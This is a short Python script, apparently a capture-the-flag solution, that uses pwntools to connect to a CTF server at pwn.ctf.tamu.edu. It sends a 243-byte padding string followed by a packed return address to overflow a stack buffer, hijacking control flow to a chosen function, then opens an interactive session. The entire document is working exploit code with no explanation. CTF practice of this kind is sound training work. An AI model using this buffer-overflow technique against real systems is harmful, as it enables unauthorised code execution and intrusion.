#!/usr/bin/env python

from pwn import *

r = remote('pwn.ctf.tamu.edu', 4322)
# r = process('./pwn2')

r.recvuntil('me!')
r.sendline('a' * 243 + p32(0x0804854b))

r.interactive()
